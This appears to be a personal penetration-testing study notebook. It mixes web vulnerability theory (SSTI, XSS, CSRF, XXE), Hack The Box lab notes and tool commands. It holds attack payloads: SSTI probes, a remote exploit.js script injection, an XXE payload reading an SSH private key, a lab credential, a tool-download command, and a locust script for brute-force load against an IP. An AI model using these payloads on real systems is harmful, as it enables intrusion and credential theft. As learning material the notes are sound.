to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field.

The given input is being rendered and reflected into the response. This is easily mistaken for a simple XSS, vulnerability, but it's easy to differentiate if you try to set mathematical operations within a template expressins( as below)
### Basic SSTI payloads
```
${{<%[%'"}}%\   # Polyglot
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{8*8}
```
In order to check if the server is vulnerable you should spot the differences between the response with regular data on the parameter and the given payload.
If an error is thrown it will be quiet easy to figure out that the server is vulnerable and even which engine is running. But you could also find a vulnerable server if you were expecting it to reflect the given payload and it is not being reflected or if there are some missing chars in the response.


### Cheatsheet
`alias chee='callCheatSh(){ curl cheat.sh/"$@" ;}; callCheatSh'`            # call Cheat.sh for cheat sheets on an cli tool

### Misc
`brew cleanup` clean up HTB memory on Mac

```
# HTB Jerry ( 1 liner Encode User/PW combos into B64)
for i in $(cat fileA.txt); do for j in $(cat fileB.txt); do echo $i:$j | base64; done; done
```
### Install Wine ( run windows exe on KAli i think )
- `apt install wine`
- `dpkg --add-architecture i386 && apt-get update && apt-get install wine32:i386`
- Then can run `Ollydbg` `ollydbg`

### Disable the CSS by pasting the following into the dev tools console
- `var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`
- `brew install mitmproxy`
- `pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`

### Regexes for vs code

- `password(.*)"(.*)"`# find the term "password" followed by anything and then a pair of quotations marks with text within them
- `auth(.*)"(.*)"`# find the term "auth" followed by anything and then a pair of quotations marks with text within them

### Secrets and Trufflehog
- `detect-secrets -C . scan > .secrets.basline` # Run detect secrts and make a basline file for the repo
- `detect-secrets audit .secrets.baseline`
- `trufflehog --regex <FULLPATHTOCODE>`
## Trivy ( scan local code from within a container)
- `docker container run --rm -it -v $(pwd):/mnt/reports aquasec/trivy fs /mnt/reports/code_delete/cp4s-dataservices-operator -o /mnt/reports/LocalReportName.json`

Where:
- `run --rm`  # get rid of the data after you ran it 
- `fs < path>` # dir you want to scan
- `-v $(pwd):/mnt/reports` # Volume you want to mount between host and container, in this case out code will be in `/mnt/reports`
- `-o /mnt/reports/LocalReportName.json`  # the name of the report whihv shall appear on your machine
### har file to urls
- `cat MY-ZAP-HAR.har | jq ".log.entries[].request.url" | sort | uniq  | egrep -v anything_out_of_scope | sed -e 's/\"//g;' > url_list.txt`

### doctl (Digital Ocean cli tool)
```
doctl auth init											# intitialise Auth for the site ( Requires submission of api key) 
doctl compute ssh-key list								# list all the curretn ssh keys 

# CREATE A NEW DROPLET
doctl compute droplet create --image ubuntu-22-04-x64 --size s-1vcpu-1gb --region nyc1 --ssh-keys <SSH-KEY_ID> <CHOOSEN-NAME-OF-DROP>
doctl compute droplet delete <DROPLET-ID|DROPLET-NAME>
doctl compute droplet list --format "ID,Name,PublicIPv4"  # lists droplets in format
doctl compute droplet list --format "PublicIPv4"		  # lists droplets in juts with Ip adress
```


### Testing for clickjacking

JZ testing DS:

1. Login into the application
1. Create a new webpage with the following HTML code
1. Load the new web page in the browser

```html
<html>
   <head>
     <title>Clickjack Test Page</title>
   </head>
   <body>
     <h2>Website is vulnerable to clickjacking!</h2>
        <iframe src="<AN_EXISTING_PAGE_ON_THE_TARGET_SITE>" width="800" height="600" 
               security="restricted" ></iframe>
   </body>
</html>
```


### Cheatsheet
- `alias chee='callCheatSh(){ curl cheat.sh/"$@" ;}; callCheatSh'`

# TO READ
- https://dev.mysql.com/doc/refman/8.0/en/connecting.html
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
- https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
- https://en.wikipedia.org/wiki/Virtual_hosting # Ignition.htb
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection # SSTI

- PAYLOAD ALL THE THINGS - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Tools to understand
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr
- Rev Shell generator - https://www.revshells.com/
- Impaket : https://github.com/fortra/impacket
- Impacket MySQL - https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Pentesting Course To Read 

- [5 pen testing rules of engagement: What to consider while performing Penetration testing](https://hub.packtpub.com/penetration-testing-rules-of-engagement/) - TDO Reado
- [SANS Rules of Engagement worksheet](https://www.sans.org/posters/pen-test-rules-of-engagement-worksheet/)
- [Top 20 Google Hacking Techniques](https://securitytrails.com/blog/google-hacking-techniques) - TODO read

Forensics Course

TO read: 
- https://www.nist.gov/digital-evidence
- https://www.ojp.gov/pdffiles1/nij/grants/248770.pdf
- https://learn.ibm.com/pluginfile.php/1075656/mod_page/content/1/Chain%20of%20Custody%20Form%20Example.docx
  
TO REad: - https://www.sans.org/blog/intro-to-report-writing-for-digital-forensics/
TO READ: Forensics on Mobile
- https://csrc.nist.gov/projects/mobile-security-and-forensics
- https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-101r1.pdf

- https://www.ufsexplorer.com/articles/chances-for-data-recovery.php
- https://www.ufsexplorer.com/articles/file-systems-basics/


Incident Response Course 

TO DO read this doc - https://www.sans.org/white-papers/2021/

TO READ - Case study on Reviewing the IR process - https://www.sans.org/reading-room/whitepapers/incident/practical-incident-response-network-based-attack-37920

To read: (SANS Summary of SANS vs NIST frame works)[https://cybersecurity.att.com/blogs/security-essentials/incident-response-steps-comparison-guide]

To read: Tools - https://www.cynet.com/blog/the-7-best-free-and-open-source-incident-response-tools/
TO READ :
- https://www.sans.org/reading-room/whitepapers/analyst/soc-automation-deliverance-disaster-38225
- https://www.sans.org/reading-room/whitepapers/analyst/empowering-incident-response-automation-38862


# Other set of Notes


_"must have the ability to competently identify, exploit, and explain these vulnerabilities"_

The top 20 most common mistakes web developers make that are essential for us as penetration testers are:
No. 	Mistake
1. 	Permitting Invalid Data to Enter the Database
2. 	Focusing on the System as a Whole
3. 	Establishing Personally Developed Security Methods
4. 	Treating Security to be Your Last Step
5. 	Developing Plain Text Password Storage
6. 	Creating Weak Passwords
7. 	Storing Unencrypted Data in the Database
8. 	Depending Excessively on the Client Side
9. 	Being Too Optimistic
10.	Permitting Variables via the URL Path Name
11.	Trusting third-party code
12.	Hard-coding backdoor accounts
13.	Unverified SQL injections
14.	Remote file inclusions
15.	Insecure data handling
16.	Failing to encrypt data properly
17.	Not using a secure cryptographic system
18.	Ignoring layer 8
19.	Review user actions
20.	Web Application Firewall misconfigurations

These mistakes lead to the OWASP Top 10 vulnerabilities for web applications, which we will discuss in other modules:
No. 	Vulnerability
1. 	Injection
2. 	Broken Authentication
3. 	Sensitive Data Exposure
4. 	XML External Entities (XXE)
5. 	Broken Access Control
6. 	Security Misconfiguration
7. 	Cross-Site Scripting (XSS)
8. 	Insecure Deserialization
9. 	Using Components with Known Vulnerabilities
10. Insufficient Logging & Monitoring

## URL Encoding
An important concept to learn in HTML is URL Encoding, or percent-encoding. For a browser to properly display a page's contents, it has to know the charset in use. In URLs, for example, browsers can only use ASCII encoding, which only allows alphanumerical characters and certain special characters. Therefore, all other characters outside of the ASCII character-set have to be encoded within a URL. URL encoding replaces unsafe ASCII characters with a % symbol followed by two hexadecimal digits.

For example, the single-quote character `'` is encoded to `%27`, which can be understood by browsers as a single-quote. URLs cannot have spaces in them and will replace a space with either a + (plus sign) or %20.

Character 	Encoding
```
space 	%20
! 	%21
" 	%22
# 	%23
$ 	%24
% 	%25
& 	%26
' 	%27
( 	%28
) 	%29
```

"The W3C Document Object Model (DOM) is a platform and language-neutral interface that allows programs and scripts to dynamically access and update the content, structure, and style of a document."

The DOM standard is separated into 3 parts:

    Core DOM - the standard model for all document types
    XML DOM - the standard model for XML documents
    HTML DOM - the standard model for HTML documents


[AJAX](https://en.wikipedia.org/wiki/Ajax_(programming))

## Frameworks

As web applications become more advanced, it may be inefficient to use pure JavaScript to develop an entire web application from scratch. This is why a host of JavaScript frameworks have been introduced to improve the experience of web application development.

These platforms introduce libraries that make it very simple to re-create advanced functionalities, like user login and user registration, and they introduce new technologies based on existing ones, like the use of dynamically changing HTML code, instead of using static HTML code.

These platforms either use JavaScript as their programming language or use an implementation of JavaScript that compiles its code into JavaScript code.

Some of the most common front end JavaScript frameworks are:

    [AngularJS](https://www.w3schools.com/angular/angular_intro.asp)
    [React.js](https://www.w3schools.com/react/react_intro.asp)
    [Vue.js](https://www.w3schools.com/whatis/whatis_vue.asp)
    [jQuery](https://www.w3schools.com/jquery/)

A listing and comparison of common JavaScript frameworks can be found [here](https://en.wikipedia.org/wiki/Comparison_of_JavaScript-based_web_frameworks).

 [Sensitive data exposure OWASP](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure)

 _"one of the first things we should do when assessing a web application is to review its page source code to see if we can identify any 'low-hanging fruit', such as exposed credentials or hidden links."_

 ### Browser short key 
 ctl + u >> view web source code
 ctl + l >> copy address bar content
 ctl + k >> clear and positon cursor in address bar.
 ctl + w >> close tab
 ctl + t >> new tab
 ctl + D >> bookmark this page

## HTML injection `<<` NEEDS READING
[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection) occurs when unfiltered user input is displayed on the page. This can either be through retrieving previously submitted code, like retrieving a user comment from the back end database, or by directly displaying unfiltered user input through JavaScript on the front end.

Q: If you wanted to inject a malicious link to "www.malicious.com", and have the clickable text read 'Click Me', how would you do that?
A : `<a href="www.malicious.com">Click Me</a>`


# Cross Site Scripting (XSS)

[XSS](https://owasp.org/www-community/attacks/xss/) `<<` NEEDS READING 

Type 	Description
**Reflected XSS** - Occurs when user input is displayed on the page after processing (e.g., search result or error message).
**Stored XSS** - Occurs when user input is stored in the back end database and then displayed upon retrieval (e.g., posts or comments).
**DOM XSS** - Occurs when user input is directly shown in the browser and is written to an HTML DOM object (e.g., vulnerable username or page title).
**U XSS** ??


## Cross Site Request Forgery (CSRF)
[Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf)

The third type of front end vulnerability that is caused by unfiltered user input is Cross-Site Request Forgery (CSRF). CSRF attacks may utilize XSS vulnerabilities to perform certain queries, and API calls on a web application that the victim is currently authenticated to. This would allow the attacker to perform actions as the authenticated user. It may also utilize other vulnerabilities to perform the same functions, like utilizing HTTP parameters for attacks.

A common CSRF attack to gain higher privileged access to a web application is to craft a JavaScript payload that automatically changes the victim's password to the value set by the attacker. Once the victim views the payload on the vulnerable page (e.g., a malicious comment containing the JavaScript CSRF payload), the JavaScript code would execute automatically. It would use the victim's logged-in session to change their password. Once that is done, the attacker can log in to the victim's account and control it.

CSRF can also be leveraged to attack admins and gain access to their accounts. Admins usually have access to sensitive functions, which can sometimes be used to attack and gain control over the back-end server (depending on the functionality provided to admins within a given web application). Following this example, instead of using JavaScript code that would return the session cookie, we would load a remote .js (JavaScript) file, as follows:

HTML : `"><script src=//www.example.com/exploit.js></script>`

### Prevention
Though there should be measures on the back end to detect and filter user input, it is also always important to filter and sanitize user input on the front end before it reaches the back end, and especially if this code may be displayed directly on the client-side without communicating with the back end. Two main controls must be applied when accepting user input:

Type 	Description
**Sanitization** - Removing special characters and non-standard characters from user input before displaying it or storing it.
**Validation** - Ensuring that submitted user input matches the expected format (i.e., submitted email matched email format)

Furthermore, it is also important to sanitize displayed output and clear any special/non-standard characters. In case an attacker manages to bypass front end and back end sanitization and validation filters, it will still not cause any harm on the front end.

Once we sanitize and/or validate user input and displayed output, we should be able to prevent attacks like HTML Injection, XSS, or CSRF. Another solution would be to implement a web application firewall (WAF), which should help to prevent injection attempts automatically. However, it should be noted that WAF solutions can potentially be bypassed, so developers should follow coding best practices and not merely rely on an appliance to detect/block attacks.

As for CSRF, many modern browsers have built-in anti-CSRF measures, which prevent automatically executing JavaScript code. Furthermore, many modern web applications have anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection). Certain other measures can be taken from a functional level, like requiring the user to input their password before changing it. Many of these security measures can be bypassed, and therefore these types of vulnerabilities can still pose a major threat to the users of a web application. This is why these precautions should only be relied upon as a secondary measure, and developers should always ensure that their code is not vulnerable to any of these attacks.

This Cross-Site Request Forgery Prevention Cheat Sheet from OWASP discusses the attack and prevention measures in greater detail.

## Back end Stacks
There are many popular combinations of "stacks" for back-end servers, which contain a specific set of back end components. 
Some common examples include:
### Combinations|Components
- **LAMP** =	(`Linux, Apache, MySQL, and PHP.`\)
- **WAMP** =	(`Windows, Apache, MySQL, and PHP.`\)
- **WINS** =	(`Windows, IIS, .NET, SQL Server`\)
- **MAMP** =	(`macOS, Apache, MySQL, and PHP.`\)
- **XAMPP** =	(`Cross-Platform, Apache, MySQL, and PHP/PERL.`\)
We can find a comprehensive list of Web Solution Stacks in this [article](https://en.wikipedia.org/wiki/Solution_stack)

# Common Response codes
### Code |	Description
**Successful responses** 	
- `200 OK` :	The request has succeeded
**Redirection messages**
- `301 Moved Permanently` :	The URL of the requested resource has been changed permanently
- `302 Found` :	The URL of the requested resource has been changed temporarily
**Client error responses**
- `400 Bad Request` : The server could not understand the request due to invalid syntax
- `401 Unauthorized` :	Unauthenticated attempt to access page
- `403 Forbidden `:	The client does not have access rights to the content
- `404 Not Found` :	The server can not find the requested resource
- `405 Method Not Allowed`: The request method is known by the server but has been disabled and cannot be used
- `408 Request Timeout` : This response is sent on an idle connection by some servers, even without any previous request by the client
**Server error responses** 	
- `500 Internal Server Error`: 	The server has encountered a situation it doesn't know how to handle
- `502 Bad Gateway` :	The server, while working as a gateway to get a response needed to handle the request, received an invalid response
- `504 Gateway Timeout` :	The server is acting as a gateway and cannot get a response in time


### Web servers 
- [Apache](https://www.apache.org/) 'or httpd' is the most common web server on the internet, hosting more than 40% of all internet websites. Apache usually comes pre-installed in most Linux distributions and can also be installed on Windows and macOS servers.
- [NGINX](https://www.nginx.com/) is the second most common web server on the internet, hosting roughly 30% of all internet websites. NGINX focuses on serving many concurrent web requests with relatively low memory and CPU load by utilizing an async architecture to do so. This makes NGINX a very reliable web server for popular web applications and top businesses worldwide, which is why it is the most popular web server among high traffic websites, with around 60% of the top 100,000 websites using NGINX.
- [IIS (Internet Information Services)](https://en.wikipedia.org/wiki/Internet_Information_Services) is the third most common web server on the internet, hosting around 15% of all internet web sites. IIS is developed and maintained by Microsoft and mainly runs on Microsoft Windows Servers.
- [Apache Tomcat](https://tomcat.apache.org/) - see also
- [node](https://nodejs.org/en/) - see also

## Data Bases
### Relational (SQL) databases 
store their data in tables, rows, and columns. Each table can have unique keys, which can link tables together and create relationships between tables.
Some of the most common relational databases include:

Type 	Description
- **MySQL** : 	The most commonly used database around the internet. It is an open-source database and can be used completely free of charge
- **MSSQL** : 	Microsoft's implementation of a relational database. Widely used with Windows Servers and IIS web servers
- **Oracle** : 	A very reliable database for big businesses, and is frequently updated with innovative database solutions to make it faster and more reliable. It can be costly, even for big businesses
- **PostgreSQL** :  	Another free and open-source relational database. It is designed to be easily extensible, enabling adding advanced new features without needing a major change to the initial database design
- Other common SQL databases include: **SQLite, MariaDB, Amazon Aurora, and Azure SQL.**
### Non-relational (NoSQL)

A non-relational database does not use tables, rows, columns, primary keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored.

Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. When dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing our data.

There are 4 common storage models for NoSQL databases:

- Key-Value
- Document-Based
- Wide-Column
- Graph

Each of the above models has a different way of storing data. For example, the Key-Value model usually stores data in JSON or XML, and has a key for each pair, storing all of its data as its value:

Some of the most common NoSQL databases include:
Type 	Description
**MongoDB** : 	The most common NoSQL database. It is free and open-source, uses the Document-Based model, and stores data in JSON objects
**ElasticSearch** : 	Another free and open-source NoSQL database. It is optimized for storing and analyzing huge datasets. As its name suggests, searching for data within this database is very fast and efficient
**Apache Cassandra** : 	Also free and open-source. It is very scalable and is optimized for gracefully handling faulty values

Other common NoSQL databases include: **Redis, Neo4j, CouchDB, and Amazon DynamoDB.**

## Postgres

?? -https://www.postgresqltutorial.com/postgresql-getting-started/load-postgresql-sample-database/ ?

psql termina lcommands
```sh
postgres-> \! clear      # clear the terminal

postgres=> CREATE DATABASE dvdrental;
CREATE DATABASE
postgres=>



postgres-> \l           # list the databases
                                                List of databases
     Name      |       Owner       | Encoding |  Collate   |   Ctype    |            Access privileges
---------------+-------------------+----------+------------+------------+-----------------------------------------
 cloudsqladmin | cloudsqladmin     | UTF8     | en_US.UTF8 | en_US.UTF8 |
 dvdrental     | postgres          | UTF8     | en_US.UTF8 | en_US.UTF8 |
 postgres      | cloudsqlsuperuser | UTF8     | en_US.UTF8 | en_US.UTF8 |
 template0     | cloudsqladmin     | UTF8     | en_US.UTF8 | en_US.UTF8 | =c/cloudsqladmin                       +
               |                   |          |            |            | cloudsqladmin=CTc/cloudsqladmin
 template1     | cloudsqlsuperuser | UTF8     | en_US.UTF8 | en_US.UTF8 | =c/cloudsqlsuperuser                   +
               |                   |          |            |            | cloudsqlsuperuser=CTc/cloudsqlsuperuser
(5 rows)

postgres-> \q           # quit

#restore your DB
:$ pg_restore -d "host=35.193.143.41 port=5432 sslmode=require user=postgres dbname=dvdrental sslcert=client-cert.pem sslkey=client-key.pem sslrootcert=server-ca.pem" <PATH_TP_DB_DATA.tar>

# Log back in to the DB


# Switch the current db to dvdrental
postgres=> \c dvdrental
psql (14.10 (Homebrew), server 15.4)
WARNING: psql major version 14, server major version 15.
         Some psql features might not work.
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "dvdrental" as user "postgres".

# display all tables in the dvdrental database
dvdrental=> \dt
             List of relations
 Schema |     Name      | Type  |  Owner
--------+---------------+-------+----------
 public | actor         | table | postgres
 public | address       | table | postgres
 public | category      | table | postgres
 public | city          | table | postgres
 public | country       | table | postgres
 public | customer      | table | postgres
 public | film          | table | postgres
 public | film_actor    | table | postgres
 public | film_category | table | postgres
 public | inventory     | table | postgres
 public | language      | table | postgres
 public | payment       | table | postgres
 public | rental        | table | postgres
 public | staff         | table | postgres
 public | store         | table | postgres
(15 rows)

# Check the size of the DB
dvdrental=> SELECT pg_size_pretty(pg_database_size('dvdrental'));
 pg_size_pretty
----------------
 14 MB
(1 row)

# to see he size of all DBS
dvdrental=> SELECT datname, pg_size_pretty(pg_database_size(datname)) AS size FROM pg_database ORDER BY pg_database_size(datname) DESC;
    datname    |  size
---------------+---------
 dvdrental     | 14 MB
 cloudsqladmin | 7797 kB
 template1     | 7621 kB
 postgres      | 7597 kB
 template0     | 7597 kB
(5 rows)
\


```

# Openssl
To view the details of a certificate (e.g., client-cert.pem), use:
- `openssl x509 -in client-cert.pem -text -noout`
This command displays the certificate's subject, issuer, validity dates, and more in a readable format.

To verify a private key (e.g., client-key.pem), use:
- `openssl rsa -in client-key.pem -check`
This command checks the consistency of the private key.

To ensure a certificate and a private key match, you can compare their modulus values:
- `openssl x509 -noout -modulus -in client-cert.pem | openssl md5`
- `openssl rsa -noout -modulus -in client-key.pem | openssl md5`
If the output (MD5 hash) of both commands matches, it means the certificate and the key pair correctly.

To view the details of a CA certificate (e.g., server-ca.pem), you can use the same command as for viewing a certificate:
- `openssl x509 -in server-ca.pem -text -noout`

If you also have CSRs (Certificate Signing Request) to analyze, you can view their details using:
- `openssl req -text -noout -verify -in yourcsr.csr`

To verify a certificate against a specific CA certificate, use:
- `openssl verify -CAfile server-ca.pem client-cert.pem`
This command checks if the client-cert.pem is trusted by the server-ca.pem CA certificate.

Although your files are local, if you want to check the SSL/TLS setup of a server using these certificates or keys, you can use:
- `openssl s_client -connect hostname:port -CAfile server-ca.pem -cert client-cert.pem -key client-key.pem`
Replace` hostname:port` with the server's address and port you wish to test.

See the details inc common name of a website (htb ESCAPE)
- `openssl s_client -showcerts -connect <IP_ADDRESS>:PORT | openssl x509 -noout -text | less`
Createa pfx file
- `openssl pkcs12 - in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`


----

# Common Web Vulnerabilities
- **Broken Authentication** refers to vulnerabilities that allow attackers to bypass authentication functions.
- **Broken Access Control** refers to vulnerabilities that allow attackers to access pages and features they should not have access to.
- **Malicious File Upload** : If the web application has a file upload feature and does not properly validate the uploaded files, we may upload a malicious script (i.e., a PHP script), which will allow us to execute commands on the remote server.
- **Command Injection** - If not properly filtered and sanitized, attackers may be able to inject another command to be executed alongside the originally intended command , which allows them to directly execute commands on the back end server and gain control over it.


**Tip:** The first step is to identify the version of the web application. This can be found in many locations, like the source code of the web application. For open source web applications, we can check the repository of the web application and identify where the version number is shown (e.g,. in (version.php) page), and then check the same page on our target web application to confirm.

**TIP** = We would usually be interested in exploits with a CVE score of 8-10 or exploits that lead to Remote Code Execution. Other types of public exploits should also be considered if none of the above is available.

## Brutforceing/DDOS /Rate limiting 
```py
from locust import HttpUser, task, between
import json

# install with pip install locust
# locustfile.py class file 
# I think like this : locust -f locustfile.py --headless -u 500 -r 5 --host=https://9.30.42.139:8436/isvaop/oauth2/introspect --loglevel=error

class MyUser(HttpUser):
    wait_time = between(1, 2)  # Adjust this based on your test needs

    @task
    def send_request(self):
        url = "http://9.30.42.139:445/isvaop/oauth2/token"
        headers = {
            'dpop': 'your_invalid_dpop_token_here',  # Use an invalid DPoP token
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        payload = {
            'client_id': 'your_client_id',
            'client_secret': 'your_client_secret',
            'scope': 'your_scope',
            'grant_type': 'your_grant_type'
        }
        
        # Send POST request
        response = self.client.post(url, headers=headers, data=payload)

        # Log the response (optional)
        if response.status_code != 200:
            print(f"Failed validation attempt: {response.status_code}")

        # You can add more logic here to capture and analyze the response

```

# NEEDS READING

[Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
[Cross Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) `<<`
[Sensitive data exposure OWASP](https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure) 
[Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
[HTML injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection)
[XSS](https://owasp.org/www-community/attacks/xss/)
https://www.thesslstore.com/blog/http-security-headers/
https://owasp.org/www-project-secure-headers/
https://en.wikipedia.org/wiki/Data_access_layer
https://en.wikipedia.org/wiki/Hypervisor
https://en.wikipedia.org/wiki/Solution_stack
[Web-Server](https://en.wikipedia.org/wiki/Web_server)
[CVSS])https://en.wikipedia.org/wiki/Common_Vulnerability_Scoring_System)
https://www.balbix.com/insights/cvss-v2-vs-cvss-v3/
[Vuln Lab](https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjOzdvRs8fxAhXMMMAKHQrdAyAQFjABegQIBBAD&url=https%3A%2F%2Fwww.vulnerability-lab.com%2Findex.php&usg=AOvVaw3Ewut8Fk39kxAzmb-Dti3u)
https://sec-consult.com/vulnerability-lab/  ??  Vuln lab
[HTTP Response Codes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status)
https://en.wikipedia.org/wiki/Relational_database
[SQL INjection](https://owasp.org/www-community/attacks/SQL_Injection)
[API](https://en.wikipedia.org/wiki/API)
[SOAP])(https://en.wikipedia.org/wiki/SOAP)
[REST](https://en.wikipedia.org/wiki/Representational_state_transfer)
"anti-CSRF measures, including certain HTTP headers and flags that can prevent automated requests (i.e., anti-CSRF token, or http-only/X-XSS-Protection)."

[Basic Authentication](https://en.wikipedia.org/wiki/Basic_access_authentication)


## Have READ 
[OWASP Top 10](https://owasp.org/www-project-top-ten/)



# 3rd set of notes

## URL Encoding
When making a request to a web server, the data that we send can only contain certain characters from the
standard 128 character ASCII set. Reserved characters that do not belong to this set must be encoded. For
this reason we use an encoding procedure that is called URL Encoding . With this process for instance, the reserved character `&` becomes `%26` .

## SSTI
Template engines are designed to generate web pages by combining fixed templates with volatile data. 
Server-side template injection attacks can occur when user input is concatenated directly into a template, rather than passed in as data. 
This allows attackers to inject arbitrary template directives in order to manipulate the template engine, 
often enabling them to take complete control of the server.

Tool - https://github.com/epinna/tplmap

Node.js and Python web backend servers often make use of a software called "Template Engines".

### What is a Template Engine?

Template Engines are used to display dynamically generated content on a web page. They replace the
variables inside a template file with actual values and display these values to the client (i.e. a user opening a
page through their browser).
For instance, if a developer needs to create a user profile page, which will contain Usernames, Emails,
Birthdays and various other content, that is very hard if not impossible to achieve for multiple different
users with a static HTML page. The template engine would be used here, along a static "template" that
contains the basic structure of the profile page, which would then manually fill in the user information and
display it to the user.
Template Engines, like all software, are prone to vulnerabilities. The vulnerability that we will be focusing on
today is called Server Side Template Injection (SSTI).

## What is an SSTI?
Server-side template injection is a vulnerability where the attacker injects malicious input into a template in order
to execute commands on the server.
To put it plainly an SSTI is an exploitation technique where the attacker injects native (to the Template
Engine) code into a web page. The code is then run via the Template Engine and the attacker gains code
execution on the affected server.
This attack is very common on Node.js websites and there is a good possibility that a Template Engine is
being used to reflect the email that the user inputs in the contact field.

### Basic SSTI payloads
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```


TO Read 
- https://dev.mysql.com/doc/refman/8.0/en/connecting.html
- https://www.ivoidwarranties.tech/posts/pentesting-tuts/responder/cheatsheet/
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
- https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds#lfi
- https://en.wikipedia.org/wiki/Virtual_hosting # Ignition.htb
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection # SSTI

- PAYLOAD ALL THE THINGS - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

  
Tools to understand
- https://github.com/SpiderLabs/Responder
- https://github.com/Hackplayers/evil-winr
- Rev Shell generator - https://www.revshells.com/
- Impaket : https://github.com/fortra/impacket
- Impacket MySQL - https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Jenkins hacking - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms?q=jenkins#jenkins

### HTB MArkup

XXE PL 
<?xml version = "1.0"?>INSERTPAYLOAD IN HERE<order><quantity>fdasd</quantity><item>Electronics</item><address>rewqrewq</address></order>

as per: <?xml version = "1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/users/daniel/.ssh/id_rsa'?]><order><quantity>fdasd</quantity><item>Electronics</item><address>rewqrewq</address></order>

INteresting - https://gist.github.com/AvasDream/47f13a510e543009a50c8241276afc24
Read - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

## Java 
Both Burp and ZAP rely on Java Runtime Environment (JRE) to run, but this package should be included in the installer by default. If not, we can follow the instructions found on this [page](https://docs.oracle.com/goldengate/1212/gg-winux/GDRAD/java.htm#BGBFJHAB).


## Proxies

**Cirts**
- _Once we have our certificates, we can install them within Firefox by browsing to `about:preferences#privacy`, scrolling to the bottom, and clicking View Certificates._

### Architype (HTB) 

`Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`

- https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py  
- https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/

Install and run Impacket 
1. `git clone https://github.com/SecureAuthCorp/impacket.git`
2. Navigate to the folder - `cd impacket`
3. `pip3 install -r requirements.txt`
4. `python3 setup.py install`


Note: **This is wrong** `python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.57.196 -windows-auth`. The forward slash should be a back slash as in `ARCHETYPE`.

To Read
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege
- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/juicypotato

Snipets---

smbclient -N -L \\\\{TARGET_IP}\\
-N : No password
-L : This option allows you to look at what services are available on a server


┌──(root㉿kali)-[~/Tools/impacket/examples]
└─# python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.58.104 -windows-auth 

python3 -m http.server 80
powershell
wget http://10.10.14.114/winPEASx64.exe -outfile winPEASx64.exe

auth



---Tools
NC 64 bit binary in the tool kit : https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------
WinPeas : https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe



